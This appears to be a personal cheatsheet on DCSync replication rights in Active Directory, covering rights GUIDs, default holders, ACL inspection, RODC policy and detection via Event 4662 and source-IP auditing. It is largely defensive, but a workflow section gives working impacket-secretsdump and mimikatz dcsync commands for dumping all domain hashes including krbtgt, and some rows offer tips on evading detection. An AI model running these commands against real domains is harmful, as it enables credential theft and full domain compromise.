---
aliases:
  - DCSync Definition
  - GetChanges
  - GetChangesAll
  - Replication GUID
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - DCSync Rights Discovery]]"
---
# AD - DCSync Rights Discovery - Rights Definition

***

## Replication Extended Rights

| **Right** | **GUID** | **Notas** |
|:---:|:---:|:---:|
| DS-Replication-Get-Changes | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | Replication base. |
| DS-Replication-Get-Changes-All | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | Required for full DCSync. |
| DS-Replication-Get-Changes-In-Filtered-Set | `89e95b76-444d-4c62-991a-0facbeda640c` | Filtered set (RODC). |
| DS-Replication-Synchronize | `1131f6ab-9c07-11d1-f79f-00c04fc2dcd2` | Trigger replication. |
| DS-Replication-Manage-Topology | `1131f6ac-9c07-11d1-f79f-00c04fc2dcd2` | Manage repl. |
| DS-Replication-Monitor-Topology | `f98340fb-7c5b-4cdb-a00b-2ebdfa115a96` | Monitor only. |
| Replicating Directory Changes (UI label) | Get-Changes | UI mapping. |
| Replicating Directory Changes All (UI) | Get-Changes-All | UI mapping. |
| Both required for DCSync | Combined | Standard. |
| Get-Changes alone insufficient | Edge | Standard. |
| RODC scope: Filtered set only | Limited | Edge. |
| Cross-domain rights | Forest scope | Adjacent. |
| Per-domain replication | Each domain | Standard. |
| Default holders: DA, EA, Domain Controllers | Standard | Standard. |
| Non-default holders = audit risk | Critical | Audit. |
| Detection: replication queries from non-DC | Defender | Adjacent. |
^ad-dcsync-rights

### Rights GUID reference

```
DS-Replication-Get-Changes
  GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
  Effect: Read replicated attributes (some)

DS-Replication-Get-Changes-All
  GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
  Effect: Read all replicated attributes including secrets

DS-Replication-Get-Changes-In-Filtered-Set
  GUID: 89e95b76-444d-4c62-991a-0facbeda640c
  Effect: Read filtered attribute set (RODC)
```

___

## DCSync Mechanism

| **Step** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| 1. Auth as principal with rights | Standard | Standard. |
| 2. Send DRSUAPI request | DRSUAPI = Directory Replication Service API | RPC. |
| 3. Specify target user (or all) | Per-user or full dump | Standard. |
| 4. DC replies with NT hash + Kerberos keys | Encrypted | Standard. |
| 5. Decrypt with session key | Auto | Standard. |
| krbtgt hash recoverable | Critical | Standard. |
| All user passwords recoverable | Critical | Standard. |
| Trust account hashes recoverable | Cross-trust impact | Critical. |
| Implementation: secretsdump.py | Standard | Tool. |
| Implementation: mimikatz dcsync | Standard | Tool. |
| RPC port 49152+ (RPC dynamic) | Network | Standard. |
| LDAP not required | DRSUAPI separate | Standard. |
| Detection: DRSUAPI events | Defender | Adjacent. |
| Detection: replication anomaly | Defender ML | Modern. |
| Modern: BloodHound + Defender for Identity | Modern | Standard. |
| Audit: replication source IPs | Adjacent | Defender. |
^ad-dcsync-mechanism

### DCSync workflow

```bash
# Linux Impacket
impacket-secretsdump dom.local/admin:pass@DC -just-dc

# Output: all NT hashes including krbtgt
# Format: user:RID:LM:NT:::

# Per-user
impacket-secretsdump dom.local/admin:pass@DC -just-dc-user krbtgt

# With NT hash auth (PtH)
impacket-secretsdump -hashes :NTHASH dom.local/user@DC -just-dc
```

```cmd
:: Mimikatz (Windows)
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:dom.local /user:krbtgt
```

___

## Default DCSync Holders

| **Principal** | **Standard** | **Notas** |
|:---:|:---:|:---:|
| Domain Admins | Yes | Standard. |
| Enterprise Admins | Yes (forest) | Standard. |
| Administrators (BUILTIN) | Yes | Standard. |
| Domain Controllers | Yes | DC computer accounts. |
| Read-only Domain Controllers | Filtered scope | Edge. |
| SYSTEM | Yes | Local system. |
| Self (computer self-replication) | Yes | Standard. |
| Cert Publishers | No (default) | Adjacent. |
| Backup Operators | No (default) | Adjacent. |
| Server Operators | No (default) | Adjacent. |
| Account Operators | No (default) | Adjacent. |
| Pre-Windows 2000 | No | Adjacent. |
| Cross-trust DCs | Edge | Adjacent. |
| Forest root DCs | Yes | Standard. |
| Foreign DA | Edge — usually no | Edge. |
| Default + custom | Audit non-default | Standard. |
^ad-dcsync-defaults

### Default holders verification

```powershell
# Should match expected default holders
$dcsyncRights = @(
  "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",  # Get-Changes
  "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"   # Get-Changes-All
)

$expectedDefaults = @(
  "Domain Admins",
  "Enterprise Admins",
  "Administrators",
  "Domain Controllers",
  "Enterprise Read-only Domain Controllers",
  "SYSTEM"
)

Get-Acl "AD:$((Get-ADDomain).DistinguishedName)" |
  Select -ExpandProperty Access |
  Where {
    $_.AccessControlType -eq "Allow" -and
    $_.ObjectType -in $dcsyncRights
  } |
  Where {
    $name = $_.IdentityReference.Value -replace ".*\\",""
    $expectedDefaults -notcontains $name
  } |
  Select IdentityReference,ActiveDirectoryRights,ObjectType
# Output: NON-DEFAULT DCSync holders (audit critical)
```

___

## Storage Location of DCSync Rights

| **Location** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Domain root object | `DC=dom,DC=local` | Primary. |
| Granted via DACL on domain root | Standard | Standard. |
| ExtendedRight type ACE | Specific to GUIDs | Standard. |
| Per-domain | Each domain has own | Adjacent. |
| Forest root domain | Tier 0 forest-wide | Standard. |
| Cross-domain replication | Edge | Adjacent. |
| RODC filtered scope | Limited | Edge. |
| `nTSecurityDescriptor` attribute | Standard | Standard. |
| Inheritance from domain root | Standard | Standard. |
| Per-OU not applicable | Domain-wide right | Standard. |
| Detection: domain root ACL modify | Defender | Critical alert. |
| Audit: per-domain DCSync holders | Standard | Compliance. |
| Documented baseline | Standard | Adjacent. |
| Cross-correlate with priv tier | Standard | Audit. |
| Stale ACE | Audit | Standard. |
| Modern: continuous monitoring | Defender | Standard. |
^ad-dcsync-location

### Domain root ACL inspection

```bash
# LDAP raw
ldapsearch -h DC -D 'dom\u' -w pass \
  -b "DC=dom,DC=local" -s base \
  "(objectClass=*)" nTSecurityDescriptor

# bloodyAD decoded
bloodyAD --host DC -d dom -u user -p pass \
  get object "DC=dom,DC=local" --resolve-sd

# Filter for DCSync GUIDs in output
```

___

## Detection Considerations

| **Aspect** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Event ID 4662 | Per-attribute access | Per-object. |
| Filter: Replicating Directory GUID | Specific filter | Defender. |
| Detection: replication from non-DC IP | Anomaly | Defender ML. |
| Microsoft Defender for Identity | DCSync alert | Modern. |
| Sysmon network DRSUAPI | Adjacent | Adjacent. |
| Detection: DRSUAPI from server | DC-only IP whitelist | Defender. |
| Audit log retention | Standard | Compliance. |
| Bulk DCSync = critical alert | Defender | Standard. |
| Per-user DCSync (just-dc-user) | Stealthier | OPSEC. |
| Detection: replication anomaly | Modern | Defender. |
| OPSEC: source IP from DC | Edge | OPSEC. |
| Modern: extreme alerting | Critical | Standard. |
| Compliance: detected/responded events | Standard | Adjacent. |
| Cross-correlate with auth events | Standard | Defender. |
| Honeytoken: krbtgt access alert | Defender plant | Detection. |
| Honeypot accounts: monitor reads | Defender | Detection. |
^ad-dcsync-detection

### Detection signal patterns

```
Event ID 4662 (Object access — Directory Service):
  Object Server: DS
  Object Type: Domain
  Properties: 
    1131f6aa-9c07-11d1-f79f-00c04fc2dcd2  (Get-Changes)
    1131f6ad-9c07-11d1-f79f-00c04fc2dcd2  (Get-Changes-All)

Microsoft Defender for Identity:
  Alert: "Suspicious replication request"

Source IP analysis:
  Replication from non-DC IP = anomaly
  Replication from workstation = critical alert
```

___

## Replication Filtered Set (RODC)

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| RODC = Read-Only DC | Filtered creds | Standard. |
| `Get-Changes-In-Filtered-Set` | RODC scope right | Standard. |
| RODC krbtgt-RODC | Filtered krbtgt | Specific. |
| Cached creds only on RODC | Per RODC password replication policy | Standard. |
| `msDS-RevealedDSAs` attribute | Cached principals | Adjacent. |
| `msDS-NeverRevealGroup` | Denied principals | Hardening. |
| `msDS-RevealOnDemandGroup` | Allowed principals | Standard. |
| Tier 0 typically denied | Best practice | Standard. |
| Compromise RODC = filtered creds | Limited blast | Standard. |
| BloodHound RODC support | Modern | Tool. |
| Detection: RODC replication anomaly | Defender | Adjacent. |
| Forest root RODC | Edge | Edge. |
| Cross-domain RODC | Edge | Adjacent. |
| `Get-Changes-In-Filtered-Set` rights granted to RODCs | Standard | Standard. |
| RODC misconfig: too many cached | Audit | Standard. |
| Per-RODC password replication policy audit | Standard | Compliance. |
^ad-dcsync-rodc

### RODC analysis

```powershell
# RODCs in domain
Get-ADDomainController -Filter {IsReadOnly -eq $true} | Select Name,Site

# Per-RODC password replication policy
$rodcs = Get-ADDomainController -Filter {IsReadOnly -eq $true}
foreach ($rodc in $rodcs) {
  Write-Host "`n=== $($rodc.Name) ==="
  
  # Allowed (will reveal password)
  Write-Host "Allowed (reveals password):"
  Get-ADDomainControllerPasswordReplicationPolicy $rodc -Allowed |
    Select Name,SamAccountName | Format-Table
  
  # Denied
  Write-Host "Denied (won't reveal):"
  Get-ADDomainControllerPasswordReplicationPolicy $rodc -Denied |
    Select Name,SamAccountName | Format-Table
}
```

___

## DCSync vs Replication for Security

| **Aspect** | **DCSync (atacante)** | **DC Replication (legit)** |
|:---:|:---:|:---:|
| Source | Non-DC host | DC |
| Authentication | Compromised user/computer | DC machine account |
| Destination | Atacante | Other DC |
| Frequency | One-shot typically | Periodic (15min default) |
| Detection signal | Non-DC source IP | DC-to-DC traffic |
| Impact | Credential theft | Standard operation |
| Microsoft Defender for Identity | DCSync alert | No alert |
| Modern hardening: source IP whitelist | DC-only allowed | Standard. |
| Compliance: replication audit baseline | Defined IPs | Standard. |
| RODC replication | Filtered | Standard. |
| Cross-domain replication | Forest | Standard. |
| Network: TCP RPC dynamic ports | Both | Standard. |
| Adjacent: Trust replication | Edge | Adjacent. |
| OPSEC: DCSync from DC = bypass IP detection | Edge | OPSEC. |
| Modern: extreme alerting on DCSync | Standard | Defender. |
| Per-DC source IP audit | Standard | Adjacent. |
^ad-dcsync-vs-replication

### Source IP audit

```powershell
# All DCs in domain
$dcs = Get-ADDomainController -Filter * | Select -ExpandProperty IPv4Address

# In SIEM, alert on Event 4662 with replication GUID where source IP NOT in $dcs
# Custom detection: Replication from non-DC IP = critical alert
```

***
